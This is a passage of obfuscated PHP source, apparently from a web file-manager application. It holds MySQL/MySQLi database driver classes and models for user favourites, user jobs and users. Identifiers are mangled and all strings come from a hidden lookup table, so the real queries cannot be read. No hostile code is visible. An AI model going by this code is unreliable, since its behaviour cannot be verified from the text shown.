$this->pconnect; if ($”Ñ­­·¥) { $this->linkID[$—¢„ âÖ] = mysql_pconnect($Â‚¾şÚ, $üåº–œ[$Õñôíû[890]], $üåº–œ[$Õñôíû[891]], 131072); } else { $this->linkID[$—¢„ âÖ] = mysql_connect($Â‚¾şÚ, $üåº–œ[$Õñôíû[890]], $üåº–œ[$Õñôíû[891]], !0, 131072); } if (!$this->linkID[$—¢„ âÖ] || !empty($üåº–œ[$Õñôíû[21]]) && !mysql_select_db($üåº–œ[$Õñôíû[21]], $this->linkID[$—¢„ âÖ])) { think_exception(mysql_error()); } $¡ß§È±É = mysql_get_server_info($this->linkID[$—¢„ âÖ]); mysql_query($Õñôíû[892] . think_config($Õñôíû[893]) . $Õñôíû[58], $this->linkID[$—¢„ âÖ]); if ($¡ß§È±É > $Õñôíû[894]) { mysql_query($Õñôíû[895], $this->linkID[$—¢„ âÖ]); } $this->connected = !0; if (1 != think_config($Õñôíû[22])) { unset($this->config); } } return $this->linkID[$—¢„ âÖ]; } public function free() { mysql_free_result($this->queryID); $this->queryID = null; } public function query($³†çµ¶±) { $ß‰ËƒÚ¶ =& $_SERVER[Îûáû“ş]; if (0 === stripos($³†çµ¶±, $ß‰ËƒÚ¶[264])) { $this->close(); $this->connected = !1; } $this->initConnect(!1); if (!$this->_linkID) { return !1; } $this->queryStr = $³†çµ¶±; if ($this->queryID) { $this->free(); } think_action_status($ß‰ËƒÚ¶[23], 1); think_status($ß‰ËƒÚ¶[24]); $this->queryID = mysql_query($³†çµ¶±, $this->_linkID); $this->debug(); if (!1 === $this->queryID) { $this->error(); return !1; } else { $this->numRows = mysql_num_rows($this->queryID); return $this->getAll(); } } public function execute($ƒ½¶¼öë) { $µ›Šïşî =& $_SERVER[Îûáû“ş]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } $this->queryStr = $ƒ½¶¼öë; if ($this->queryID) { $this->free(); } think_action_status($µ›Šïşî[25], 1); think_status($µ›Šïşî[24]); $ôÅíï˜ = mysql_query($ƒ½¶¼öë, $this->_linkID); $this->debug(); if (!1 === $ôÅíï˜) { $this->error(); return !1; } else { $this->numRows = mysql_affected_rows($this->_linkID); $this->lastInsID = mysql_insert_id($this->_linkID); return $this->numRows; } } public function startTrans() { $this->initConnect(!0); if (!$this->_linkID) { return !1; } if ($this->transTimes == 0) { mysql_query($_SERVER[Îûáû“ş][896], $this->_linkID); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $¹‚„õØŠ = mysql_query($_SERVER[Îûáû“ş][897], $this->_linkID); $this->transTimes = 0; if (!$¹‚„õØŠ) { $this->error(); return !1; } } return !0; } public function rollback() { if ($this->transTimes > 0) { $ıÕÎ‰³ü = mysql_query($_SERVER[Îûáû“ş][898], $this->_linkID); $this->transTimes = 0; if (!$ıÕÎ‰³ü) { $this->error(); return !1; } } return !0; } private function getAll() { $ç…İƒ€ = array(); if ($this->numRows > 0) { while ($ì¤ï¦ = mysql_fetch_assoc($this->queryID)) { $ç…İƒ€[] = $ì¤ï¦; } mysql_data_seek($this->queryID, 0); } return $ç…İƒ€; } public function getFields($üÀ†ø¹») { $Š‚Õüì† =& $_SERVER[Îûáû“ş]; $´ß³´Íƒ = $this->query($Š‚Õüì†[899] . $this->parseKey($üÀ†ø¹»)); $ÜêªüùÏ = array(); if ($´ß³´Íƒ) { foreach ($´ß³´Íƒ as $Ü†õè´ => $Ö²Ãœ»¸) { $ÜêªüùÏ[$Ö²Ãœ»¸[$Š‚Õüì†[31]]] = array($Š‚Õüì†[32] => $Ö²Ãœ»¸[$Š‚Õüì†[31]], $Š‚Õüì†[33] => $Ö²Ãœ»¸[$Š‚Õüì†[34]], $Š‚Õüì†[35] => (bool) (strtoupper($Ö²Ãœ»¸[$Š‚Õüì†[36]]) === $Š‚Õüì†[900]), $Š‚Õüì†[37] => $Ö²Ãœ»¸[$Š‚Õüì†[38]], $Š‚Õüì†[39] => strtolower($Ö²Ãœ»¸[$Š‚Õüì†[40]]) == $Š‚Õüì†[41], $Š‚Õüì†[42] => strtolower($Ö²Ãœ»¸[$Š‚Õüì†[43]]) == $Š‚Õüì†[44]); } } return $ÜêªüùÏ; } public function getTables($µ˜ª³‰µ = '') { $’¡àõå =& $_SERVER[Îûáû“ş]; if (!empty($µ˜ª³‰µ)) { $ŸØü×« = $’¡àõå[901] . $µ˜ª³‰µ . $’¡àõå[902]; } else { $ŸØü×« = $’¡àõå[903]; } $ã°Œ½ñÚ = $this->query($ŸØü×«); $ë›æ¾¾– = array(); foreach ($ã°Œ½ñÚ as $Àç´à‹” => $Ûªôß¶ª) { $ë›æ¾¾–[$Àç´à‹”] = current($Ûªôß¶ª); } return $ë›æ¾¾–; } public function replace($Æ£¡¨¬Ú, $é­· = array()) { $¯¯¸ñ²‹ =& $_SERVER[Îûáû“ş]; foreach ($Æ£¡¨¬Ú as $±Îú¾‰© => $ÑˆûÖ£Ë) { $ÑÀ‹ıØä = $this->parseValue($ÑˆûÖ£Ë); if (is_scalar($ÑÀ‹ıØä)) { $Ú¹³¹ø[] = $ÑÀ‹ıØä; $¸ù¼ò€Ü[] = $this->parseKey($±Îú¾‰©); } } $ê¬èàŒ = $¯¯¸ñ²‹[904] . $this->parseTable($é­·[$¯¯¸ñ²‹[279]]) . $¯¯¸ñ²‹[905] . implode($¯¯¸ñ²‹[50], $¸ù¼ò€Ü) . $¯¯¸ñ²‹[906] . implode($¯¯¸ñ²‹[50], $Ú¹³¹ø) . $¯¯¸ñ²‹[907]; return $this->execute($ê¬èàŒ); } public function insertAll($˜îŒóØò, $–¨ÛÉª• = array(), $­––û£ = false) { $Œ÷Æ×£ë =& $_SERVER[Îûáû“ş]; if (!is_array($˜îŒóØò[0])) { return !1; } $µÃØó‡¤ = array_keys($˜îŒóØò[0]); $àÅ÷Ï½ = array(); foreach ($˜îŒóØò as $”™ğšÂ¹) { $×ôÆ³  = array(); foreach ($”™ğšÂ¹ as $èÍ””å³ => $É¦èšÖé) { $É¦èšÖé = $this->parseValue($É¦èšÖé); if (is_scalar($É¦èšÖé)) { $×ôÆ³ [] = $É¦èšÖé; } } $àÅ÷Ï½[] = $Œ÷Æ×£ë[260] . implode($Œ÷Æ×£ë[50], $×ôÆ³ ) . $Œ÷Æ×£ë[907]; } array_walk($µÃØó‡¤, array($this, $Œ÷Æ×£ë[908])); $æ Óéçª = ($­––û£ ? $Œ÷Æ×£ë[909] : $Œ÷Æ×£ë[910]) . $Œ÷Æ×£ë[911] . $this->parseTable($–¨ÛÉª•[$Œ÷Æ×£ë[279]]) . $Œ÷Æ×£ë[905] . implode($Œ÷Æ×£ë[50], $µÃØó‡¤) . $Œ÷Æ×£ë[912] . implode($Œ÷Æ×£ë[50], $àÅ÷Ï½); return $this->execute($æ Óéçª); } public function close() { if ($this->_linkID) { mysql_close($this->_linkID); } $this->_linkID = null; } public function error() { $²ŒÒÑºı =& $_SERVER[Îûáû“ş]; $this->error = mysql_errno() . $²ŒÒÑºı[4] . mysql_error($this->_linkID); if ($²ŒÒÑºı[12] != $this->queryStr) { $this->error .= LNG($²ŒÒÑºı[48]) . $this->queryStr; } think_trace($this->error, $²ŒÒÑºı[12], $²ŒÒÑºı[49]); return $this->error; } public function escapeString($Û÷æ÷) { if ($this->_linkID) { return mysql_real_escape_string($Û÷æ÷, $this->_linkID); } else { return mysql_escape_string($Û÷æ÷); } } public function parseKey(&$´Ä¨×ôé, $³æø¶¤§ = true) { $ı¯½¨úû =& $_SERVER[Îûáû“ş]; if ($³æø¶¤§) { $´Ä¨×ôé = $this->parseKeyCheck($´Ä¨×ôé); } if ($´Ä¨×ôé != $ı¯½¨úû[189] && !preg_match($ı¯½¨úû[913], $´Ä¨×ôé)) { $´Ä¨×ôé = $ı¯½¨úû[385] . trim($´Ä¨×ôé, $ı¯½¨úû[385]) . $ı¯½¨úû[385]; } return $´Ä¨×ôé; } } class DbMysqli extends Db { public function __construct($ÖÔÙˆÑ– = '') { $©ˆÑôºî =& $_SERVER[Îûáû“ş]; if (!extension_loaded($©ˆÑôºî[914])) { think_exception(think_lang($©ˆÑôºî[14]) . $©ˆÑôºî[915]); } if (!empty($ÖÔÙˆÑ–)) { $this->config = $ÖÔÙˆÑ–; if (empty($this->config[$©ˆÑôºî[17]])) { $this->config[$©ˆÑôºî[17]] = $©ˆÑôºî[12]; } } } public function connect($·åöòè = '', $¯˜í¯Şö = 0) { $Ù½Áõıê =& $_SERVER[Îûáû“ş]; if (!isset($this->linkID[$¯˜í¯Şö])) { if (empty($·åöòè)) { $·åöòè = $this->config; } $this->linkID[$¯˜í¯Şö] = new mysqli($·åöòè[$Ù½Áõıê[888]], $·åöòè[$Ù½Áõıê[890]], $·åöòè[$Ù½Áõıê[891]], $·åöòè[$Ù½Áõıê[21]], $·åöòè[$Ù½Áõıê[889]] ? intval($·åöòè[$Ù½Áõıê[889]]) : 3306); if (mysqli_connect_errno()) { think_exception(mysqli_connect_error()); } $ù¹Ñ™Éµ = $this->linkID[$¯˜í¯Şö]->server_version; $this->linkID[$¯˜í¯Şö]->query($Ù½Áõıê[892] . think_config($Ù½Áõıê[893]) . $Ù½Áõıê[58]); if ($ù¹Ñ™Éµ > $Ù½Áõıê[894]) { $this->linkID[$¯˜í¯Şö]->query($Ù½Áõıê[895]); } $this->connected = !0; if (1 != think_config($Ù½Áõıê[22])) { unset($this->config); } } return $this->linkID[$¯˜í¯Şö]; } public function free() { $this->queryID->free_result(); $this->queryID = null; } public function query($Ù¬ÂÛ¬¢) { $ÏĞÎéà© =& $_SERVER[Îûáû“ş]; $this->initConnect(!1); if (!$this->_linkID) { return !1; } $this->queryStr = $Ù¬ÂÛ¬¢; if ($this->queryID) { $this->free(); } think_action_status($ÏĞÎéà©[23], 1); think_status($ÏĞÎéà©[24]); $this->queryID = $this->_linkID->query($Ù¬ÂÛ¬¢); if ($this->_linkID->more_results()) { while (($±Éƒ¶‡“ = $this->_linkID->next_result()) != NULL) { $±Éƒ¶‡“->free_result(); } } $this->debug(); if (!1 === $this->queryID) { $this->error(); return !1; } else { $this->numRows = $this->queryID->num_rows; $this->numCols = $this->queryID->field_count; return $this->getAll(); } } public function execute($éÆÛ–Åµ) { $ıÉà½ =& $_SERVER[Îûáû“ş]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } $this->queryStr = $éÆÛ–Åµ; if ($this->queryID) { $this->free(); } think_action_status($ıÉà½[25], 1); think_status($ıÉà½[24]); $ÛØƒİË² = $this->_linkID->query($éÆÛ–Åµ); $this->debug(); if (!1 === $ÛØƒİË²) { $this->error(); return !1; } else { $this->numRows = $this->_linkID->affected_rows; $this->lastInsID = $this->_linkID->insert_id; return $this->numRows; } } public function startTrans() { $this->initConnect(!0); if ($this->transTimes == 0) { $this->_linkID->autocommit(!1); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $å ËÔ‹¼ = $this->_linkID->commit(); $this->_linkID->autocommit(!0); $this->transTimes = 0; if (!$å ËÔ‹¼) { $this->error(); return !1; } } return !0; } public function rollback() { if ($this->transTimes > 0) { $úÄ¥¥« = $this->_linkID->rollback(); $this->transTimes = 0; if (!$úÄ¥¥«) { $this->error(); return !1; } } return !0; } private function getAll() { $äáî«¡ = array(); if ($this->numRows > 0) { for ($ÈĞ÷ö•§ = 0; $ÈĞ÷ö•§ < $this->numRows; $ÈĞ÷ö•§++) { $äáî«¡[$ÈĞ÷ö•§] = $this->queryID->fetch_assoc(); } $this->queryID->data_seek(0); } return $äáî«¡; } public function getFields($¡¹âÔ¤) { $áïıÀÏ =& $_SERVER[Îûáû“ş]; $ÛÓ£ê¸ = $this->query($áïıÀÏ[899] . $this->parseKey($¡¹âÔ¤)); $Ïş¬òìÜ = array(); if ($ÛÓ£ê¸) { foreach ($ÛÓ£ê¸ as $ºô›óã£ => $–üšËâå) { $Ïş¬òìÜ[$–üšËâå[$áïıÀÏ[31]]] = array($áïıÀÏ[32] => $–üšËâå[$áïıÀÏ[31]], $áïıÀÏ[33] => $–üšËâå[$áïıÀÏ[34]], $áïıÀÏ[35] => (bool) ($–üšËâå[$áïıÀÏ[36]] === $áïıÀÏ[12]), $áïıÀÏ[37] => $–üšËâå[$áïıÀÏ[38]], $áïıÀÏ[39] => strtolower($–üšËâå[$áïıÀÏ[40]]) == $áïıÀÏ[41], $áïıÀÏ[42] => strtolower($–üšËâå[$áïıÀÏ[43]]) == $áïıÀÏ[44]); } } return $Ïş¬òìÜ; } public function getTables($¬ì‰÷šì = '') { $ŸÏ«ğìÇ =& $_SERVER[Îûáû“ş]; $øœÓº³Ì = !empty($¬ì‰÷šì) ? $ŸÏ«ğìÇ[901] . $¬ì‰÷šì . $ŸÏ«ğìÇ[902] : $ŸÏ«ğìÇ[903]; $˜‚í¥«‰ = $this->query($øœÓº³Ì); $õîŸÑ¸Û = array(); if ($˜‚í¥«‰) { foreach ($˜‚í¥«‰ as $ÍƒÅ™— => $î¤ˆ–“¦) { $õîŸÑ¸Û[$ÍƒÅ™—] = current($î¤ˆ–“¦); } } return $õîŸÑ¸Û; } public function replace($€·Û®©ó, $û´¢¯ = array()) { $¨ããßËÉ =& $_SERVER[Îûáû“ş]; foreach ($€·Û®©ó as $â¿†³Ä½ => $úØ²»åà) { $´ÚÂ§»£ = $this->parseValue($úØ²»åà); if (is_scalar($´ÚÂ§»£)) { $é¼‹©Ÿ[] = $´ÚÂ§»£; $¡Èã‘öï[] = $this->parseKey($â¿†³Ä½); } } $¿åã±Ş = $¨ããßËÉ[904] . $this->parseTable($û´¢¯[$¨ããßËÉ[279]]) . $¨ããßËÉ[905] . implode($¨ããßËÉ[50], $¡Èã‘öï) . $¨ããßËÉ[906] . implode($¨ããßËÉ[50], $é¼‹©Ÿ) . $¨ããßËÉ[907]; return $this->execute($¿åã±Ş); } public function insertAll($½êÑèéì, $ıû¥ß = array(), $¸ğ¹ê×¬ = false) { $šıÒøû =& $_SERVER[Îûáû“ş]; if (!is_array($½êÑèéì[0])) { return !1; } $ÆŒ¤¡°¦ = array_keys($½êÑèéì[0]); $¢Ûã„® = array(); foreach ($½êÑèéì as $¼Â†Ûù­) { $…¤ÈÓ¬‹ = array(); foreach ($¼Â†Ûù­ as $èÇÉİÚ° => $”ì£š›À) { $”ì£š›À = $this->parseValue($”ì£š›À); if (is_scalar($”ì£š›À)) { $…¤ÈÓ¬‹[] = $”ì£š›À; } } $¢Ûã„®[] = $šıÒøû[260] . implode($šıÒøû[50], $…¤ÈÓ¬‹) . $šıÒøû[907]; } array_walk($ÆŒ¤¡°¦, array($this, $šıÒøû[908])); $‘µıİŞ = $¸ğ¹ê×¬ ? $šıÒøû[909] : $šıÒøû[910]; $ìçàËó¨ = $‘µıİŞ . $šıÒøû[911] . $this->parseTable($ıû¥ß[$šıÒøû[279]]) . $šıÒøû[905] . implode($šıÒøû[50], $ÆŒ¤¡°¦) . $šıÒøû[912] . implode($šıÒøû[50], $¢Ûã„®); return $this->execute($ìçàËó¨); } public function close() { if ($this->_linkID) { $this->_linkID->close(); } $this->_linkID = null; } public function error() { $È´×“Î =& $_SERVER[Îûáû“ş]; $this->error = $this->_linkID->errno . $È´×“Î[4] . $this->_linkID->error; if ($È´×“Î[12] != $this->queryStr) { $this->error .= LNG($È´×“Î[48]) . $this->queryStr; } think_trace($this->error, $È´×“Î[12], $È´×“Î[49]); return $this->error; } public function escapeString($ ²Ï¡÷„) { if ($this->_linkID) { return $this->_linkID->real_escape_string($ ²Ï¡÷„); } else { return addslashes($ ²Ï¡÷„); } } public function parseKey(&$‘’ÃÆÜ¡, $ºø‰€çü = true) { $‡øÙ·— =& $_SERVER[Îûáû“ş]; if ($ºø‰€çü) { $‘’ÃÆÜ¡ = $this->parseKeyCheck($‘’ÃÆÜ¡); } if ($‘’ÃÆÜ¡ != $‡øÙ·—[189] && !preg_match($‡øÙ·—[913], $‘’ÃÆÜ¡)) { $‘’ÃÆÜ¡ = $‡øÙ·—[385] . trim($‘’ÃÆÜ¡, $‡øÙ·—[385]) . $‡øÙ·—[385]; } return $‘’ÃÆÜ¡; } } goto e–›ì‚…; Eªãˆíö†¬: class UserFavModel extends ModelBase { protected $tableName = "\x75\163\x65\162\137\x66\141\x76"; protected function cacheFunctionAlias($é”ç åí) { $Á«Ãíú‹ =& $_SERVER[Îûáû“ş]; return array($Á«Ãíú‹[1972] => array(USER_ID, $Á«Ãíú‹[2306])); } protected function listData() { $Ìš«Ãùª =& $_SERVER[Îûáû“ş]; $¨æ‘ÂıÛ = array($Ìš«Ãùª[1661] => USER_ID, $Ìš«Ãùª[483] => 0); $¾ß‚ùëË = $Ìš«Ãùª[2307]; $æ›ûóèû = $this->field($¾ß‚ùëË)->where($¨æ‘ÂıÛ)->order($Ìš«Ãùª[2308])->select(); return $æ›ûóèû ? $æ›ûóèû : array(); } protected function resetCache() { } protected function listView() { $ÓÑáÁğ® =& $_SERVER[Îûáû“ş]; $ßùúâÒƒ = $this->listData(); $ÜÍçÄôË = array_filter_by_field($ßùúâÒƒ, $ÓÑáÁğ®[33], $ÓÑáÁğ®[416]); $ë†¾µß² = array_to_keyvalue($ÜÍçÄôË, $ÓÑáÁğ®[12], $ÓÑáÁğ®[84]); if (!$ë†¾µß²) { return $ßùúâÒƒ; } $Ëš¸Ø¼ª = 2000; $Õ£™‰¼Å = array($ÓÑáÁğ®[417] => array($ÓÑáÁğ®[418], $ë†¾µß²)); $¿£õ–®á = Model($ÓÑáÁğ®[824])->listSource($Õ£™‰¼Å, $Ëš¸Ø¼ª); $¿£õ–®á = array_merge($¿£õ–®á[$ÓÑáÁğ®[83]], $¿£õ–®á[$ÓÑáÁğ®[82]]); $¿£õ–®á = array_to_keyvalue($¿£õ–®á, $ÓÑáÁğ®[402]); foreach ($ßùúâÒƒ as $ˆæëåòğ => $®³üÖ€¥) { $«†ÃÛ½Ø = $¿£õ–®á[$®³üÖ€¥[$ÓÑáÁğ®[84]]]; $«†ÃÛ½Ø = $«†ÃÛ½Ø ? $«†ÃÛ½Ø : array(); $ßùúâÒƒ[$ˆæëåòğ] = array_merge($«†ÃÛ½Ø, $®³üÖ€¥); } return $ßùúâÒƒ; } protected function addFav($Ù³¼áƒ, $óŞ·Ğí = '', $ğÒ¼È±ë = "\x73\157\x75\162\x63\x65") { $œø”Äˆ =& $_SERVER[Îûáû“ş]; $Óãïø‹Ï = array($œø”Äˆ[1661] => USER_ID, $œø”Äˆ[483] => 0, $œø”Äˆ[422] => $ğÒ¼È±ë, $œø”Äˆ[421] => $Ù³¼áƒ); if ($this->where($Óãïø‹Ï)->find()) { return !1; } $Óãïø‹Ï = array($œø”Äˆ[1661] => USER_ID, $œø”Äˆ[483] => 0); $•ÊÁÑÎî = $this->where($Óãïø‹Ï)->max($œø”Äˆ[1885]); if (!$•ÊÁÑÎî) { $•ÊÁÑÎî = 0; } if (!$óŞ·Ğí && $ğÒ¼È±ë == $œø”Äˆ[416]) { $¹‡Íù¥ = Model($œø”Äˆ[1341])->where(array($œø”Äˆ[417] => $Ù³¼áƒ))->find(); if (!$¹‡Íù¥) { return !1; } $óŞ·Ğí = $¹‡Íù¥[$œø”Äˆ[32]]; } $óŞ·Ğí = $this->getAutoName($óŞ·Ğí); $ÛÊ¾¿¦ï = array($œø”Äˆ[1661] => USER_ID, $œø”Äˆ[483] => 0, $œø”Äˆ[420] => $óŞ·Ğí, $œø”Äˆ[421] => $Ù³¼áƒ, $œø”Äˆ[422] => $ğÒ¼È±ë, $œø”Äˆ[1865] => $•ÊÁÑÎî + 1); return $this->add($ÛÊ¾¿¦ï); } protected function remove($è÷Óîê) { $ÅÌâÛå =& $_SERVER[Îûáû“ş]; $¦Ûû×¬ = array($ÅÌâÛå[1661] => USER_ID, $ÅÌâÛå[419] => $è÷Óîê); return $this->where($¦Ûû×¬)->delete(); } protected function removeByName($ó²ô”È¢) { $ÁÁ¡”¬ =& $_SERVER[Îûáû“ş]; $ÕÑ¹€Š = array($ÁÁ¡”¬[1661] => USER_ID, $ÁÁ¡”¬[420] => $ó²ô”È¢, $ÁÁ¡”¬[483] => 0); return $this->where($ÕÑ¹€Š)->delete(); } protected function rename($¿¢»­, $¡Ôùèê©) { $Òßñ¶Õ› =& $_SERVER[Îûáû“ş]; if ($¿¢»­ == $¡Ôùèê©) { return !1; } $¾€ŸòÔß = $this->getAutoName($¡Ôùèê©); if ($¡Ôùèê© != $¾€ŸòÔß) { return !1; } $õ€öâ†½ = array($Òßñ¶Õ›[1661] => USER_ID, $Òßñ¶Õ›[483] => 0, $Òßñ¶Õ›[32] => $¿¢»­); return $this->where($õ€öâ†½)->save(array($Òßñ¶Õ›[32] => $¡Ôùèê©)); } protected function resetSort($‰îÕ‚ù¥) { $èú¨ô­© =& $_SERVER[Îûáû“ş]; $‰îÕ‚ù¥ = is_array($‰îÕ‚ù¥) ? $‰îÕ‚ù¥ : array(); $ ”Ï†¸º = array($èú¨ô­©[1661] => USER_ID); for ($ÏúØ»Û³ = 0; $ÏúØ»Û³ < count($‰îÕ‚ù¥); $ÏúØ»Û³++) { $ ”Ï†¸º[$èú¨ô­©[419]] = $‰îÕ‚ù¥[$ÏúØ»Û³]; $this->where($ ”Ï†¸º)->save(array($èú¨ô­©[1865] => $ÏúØ»Û³ + 1)); } return !0; } protected function moveTop($ßÑ¼š×) { $Ê¶ÌÌ†› =& $_SERVER[Îûáû“ş]; $á³ÚÅ¶¢ = array($Ê¶ÌÌ†›[1661] => USER_ID, $Ê¶ÌÌ†›[483] => 0); $ÆĞ‹Êå = $this->where($á³ÚÅ¶¢)->where(array($Ê¶ÌÌ†›[32] => $ßÑ¼š×))->find(); if (!$ÆĞ‹Êå) { return; } $Ğ´á®æ® = $this->field($Ê¶ÌÌ†›[399])->where($á³ÚÅ¶¢)->order($Ê¶ÌÌ†›[2308])->select(); $Ğ´á®æ® = array_to_keyvalue($Ğ´á®æ®, $Ê¶ÌÌ†›[12], $Ê¶ÌÌ†›[399]); $ÁµÔ°İÄ = $Ğ´á®æ®; $Ğ´á®æ® = array_remove_value($Ğ´á®æ®, $ÆĞ‹Êå[$Ê¶ÌÌ†›[399]]); array_unshift($Ğ´á®æ®, $ÆĞ‹Êå[$Ê¶ÌÌ†›[399]]); return $this->resetSort($Ğ´á®æ®); } protected function moveBottom($•°ª¤û˜) { $Á¨‹ö£Í =& $_SERVER[Îûáû“ş]; $—äú’Óó = array($Á¨‹ö£Í[1661] => USER_ID, $Á¨‹ö£Í[483] => 0); $ÜŞúÖ™¸ = $this->where($—äú’Óó)->max($Á¨‹ö£Í[1885]); $ª¤©âÊ = array($Á¨‹ö£Í[1885] => $ÜŞúÖ™¸ + 1); return $this->where($—äú’Óó)->where(array($Á¨‹ö£Í[32] => $•°ª¤û˜))->save($ª¤©âÊ); } private function getAutoName($ŠÁ•Š¡ê) { $‹í†Öº =& $_SERVER[Îûáû“ş]; $Üä›­éõ = array($‹í†Öº[1661] => USER_ID, $‹í†Öº[483] => 0); $”ûÓ­Ÿó = $this->field($‹í†Öº[32])->where($Üä›­éõ)->select(); $”ûÓ­Ÿó = array_to_keyvalue($”ûÓ­Ÿó, $‹í†Öº[12], $‹í†Öº[32]); if (!$”ûÓ­Ÿó || !in_array($ŠÁ•Š¡ê, $”ûÓ­Ÿó)) { return $ŠÁ•Š¡ê; } for ($×İ¹©¢“ = 0; $×İ¹©¢“ < count($”ûÓ­Ÿó); $×İ¹©¢“++) { if (!in_array($ŠÁ•Š¡ê . "\50{$×İ¹©¢“}\51", $”ûÓ­Ÿó)) { return $ŠÁ•Š¡ê . "\x28{$×İ¹©¢“}\x29"; } } return $ŠÁ•Š¡ê . "\50{$×İ¹©¢“}\51"; } } class UserJobModel extends ModelBaseLight { public $optionType = "\x53\x79\163\x74\145\x6d\56\x6a\x6f\142\x4c\151\163\164"; public $field = array("\x6e\141\155\x65", "\x64\145\163\143", "\x73\x6f\x72\164"); const JOB_KEY = "\x73\x65\x6c\146\x4a\x6f\142\x4c\x69\163\164"; public function listData($‘Èàù½ˆ = false, $©¹¼ŸÏÌ = "\163\157\x72\x74", $¬¼óäˆÙ = false) { return parent::listData($‘Èàù½ˆ, $©¹¼ŸÏÌ, $¬¼óäˆÙ); } public function remove($û±ëåª­) { return parent::remove($û±ëåª­); } public function add($ÃõŸãÁİ) { $‚ŠÁ—Ş =& $_SERVER[Îûáû“ş]; if ($this->findByName($ÃõŸãÁİ[$‚ŠÁ—Ş[32]])) { return !1; } $ÃõŸãÁİ[$‚ŠÁ—Ş[1885]] = $this->getSort(); return parent::insert($ÃõŸãÁİ); } private function getSort() { $¦Â›é­² =& $_SERVER[Îûáû“ş]; $É²ş­îÁ = parent::listData(); $¦öşœ£Ç = array_to_keyvalue($É²ş­îÁ, $¦Â›é­²[12], $¦Â›é­²[1885]); return empty($¦öşœ£Ç) ? 0 : max($¦öşœ£Ç) + 1; } public function update($¡“ã²ğÀ, $ŒÙ§ïè¡) { $×ÏŒˆÌŞ =& $_SERVER[Îûáû“ş]; $ÖöœôÃõ = parent::listData($¡“ã²ğÀ); $ÍË×£” = $this->findByName($ŒÙ§ïè¡[$×ÏŒˆÌŞ[32]]); if (!$ÖöœôÃõ || $ÍË×£” && $ÍË×£”[$×ÏŒˆÌŞ[399]] != $ÖöœôÃõ[$×ÏŒˆÌŞ[399]]) { return !1; } return parent::update($¡“ã²ğÀ, $ŒÙ§ïè¡); } public function setUserJob($ÛÄ‡åÃÅ, $ûüÜÛˆØ) { $˜êøß§í =& $_SERVER[Îûáû“ş]; if (!is_array($ûüÜÛˆØ)) { $ûüÜÛˆØ = array($ûüÜÛˆØ); } $¯ª±æ€ = parent::listData(); $ª¦Éªı = array_to_keyvalue($¯ª±æ€, $˜êøß§í[32]); $«®èÏŞâ = $˜êøß§í[378]; foreach ($ûüÜÛˆØ as $²…ĞÍÍ’) { if ($ª¦Éªı[$²…ĞÍÍ’]) { $«®èÏŞâ .= $ª¦Éªı[$²…ĞÍÍ’][$˜êøß§í[399]] . $˜êøß§í[50]; } else { $»Ÿúşø’ = $this->add($²…ĞÍÍ’); $«®èÏŞâ .= $»Ÿúşø’ . $˜êøß§í[50]; } } $«®èÏŞâ = rtrim($«®èÏŞâ, $˜êøß§í[50]); Model($˜êøß§í[525])->metaSet($ÛÄ‡åÃÅ, self::JOB_KEY, $«®èÏŞâ); } public function getUserJob($È¸Ãå¡Ô) { $–¯³ƒÛ³ = Model($_SERVER[Îûáû“ş][525])->metaGet($È¸Ãå¡Ô); return $this->getUserJobInfo($–¯³ƒÛ³[self::JOB_KEY]); } public function getUserJobInfo($âŞÀî) { $×Ö’ª§Š =& $_SERVER[Îûáû“ş]; $¢ö±Í‰€ = explode($×Ö’ª§Š[50], $âŞÀî); $Ø…î™  = parent::listData(); $Ø…î™  = array_remove_key($Ø…î™ , $×Ö’ª§Š[201]); $èÇÀ½ƒ« = array(); foreach ($¢ö±Í‰€ as $î Ÿşì) { if (isset($Ø…î™ [$î Ÿşì])) { $èÇÀ½ƒ«[] = $Ø…î™ [$î Ÿşì]; } } return $èÇÀ½ƒ«; } } class UserModel extends ModelBase { protected $tableName = "\x75\163\145\162"; protected $tableMeta = array("\164\141\142\154\145\116\141\x6d\x65" => "\165\x73\145\x72\137\x6d\145\x74\141", "\x6d\145\164\141\x46\x69\145\154\144" => "\x75\163\x65\x72\111\x44"); protected $simpleField = "\165\x73\145\162\x49\104\54\x6e\x69\143\x6b\x4e\141\155\x65\x2c\156\141\x6d\145\54\x61\x76\x61\x74\x61\x72\54\x73\x65\x78\54\163\164\x61\x74\x75\x73"; const ERROR_USER_NOT_EXISTS = -1; const ERROR_USER_PASSWORD_ERROR = -2; const ERROR_USER_EXIST_NAME = -3; const ERROR_USER_EXIST_PHONE = -4; const ERROR_USER_EXIST_EMAIL = -5; const ERROR_USER_LOGIN_LOCK = -6; const ERROR_IP_NOT_ALLOW = -7; const ERROR_USER_EXIST_NICKNAME = -8; protected function cacheFunctionAlias($õæãòî) { $Óò–ª±ş =& $_SERVER[Îûáû“ş]; $ óö™™í = $Óò–ª±ş[2309]; return array($Óò–ª±ş[1939] => array($õæãòî[0], $ óö™™í), $Óò–ª±ş[1941] => array($õæãòî[0], $ óö™™í), $Óò–ª±ş[2310] => array($õæãòî[0], $ óö™™í)); } protected function getInfo($ÈâŠó¨«, $ù‰¤¡Ù÷ = false) { $¼Æã«¤ = $this->getInfoSimple($ÈâŠó¨«); if (!is_array($¼Æã«¤)) { return array(); } if ($ù‰¤¡Ù÷) { return $this->_getInfoApply($¼Æã«¤); } return $this->cacheFunctionGet($_SERVER[Îûáû“ş][1943], $ÈâŠó¨«); } protected function getInfoFull($©°â Å, $Œï’ç = false) { $…ÛêşÁ° = $this->getInfoSimple($©°â Å); if (!is_array($…ÛêşÁ°)) { return array(); } if ($Œï’ç) { return $this->_getInfoApply($…ÛêşÁ°, !0); } return $this->cacheFunctionGet($_SERVER[Îûáû“ş][2311], $©°â Å); } private function _getInfoApply($“ıÙòÉŠ, $˜İ½şà = false) { $º£±Áù¶ =& $_SERVER[Îûáû“ş]; if (!$“ıÙòÉŠ) { return $“ıÙòÉŠ; } $ıêú£ûÔ = md5($º£±Áù¶[2312] . $“ıÙòÉŠ[$º£±Áù¶[891]] . $º£±Áù¶[2313] . $“ıÙòÉŠ[$º£±Áù¶[32]]); $“ıÙòÉŠ = $this->_listDataApplyItem($“ıÙòÉŠ); $„°–Éíï = Model($º£±Áù¶[1341])->metaGet($“ıÙòÉŠ[$º£±Áù¶[87]][$º£±Áù¶[402]]); $“ıÙòÉŠ[$º£±Áù¶[2314]] = $ıêú£ûÔ; $“ıÙòÉŠ[$º£±Áù¶[87]][$º£±Áù¶[2134]] = 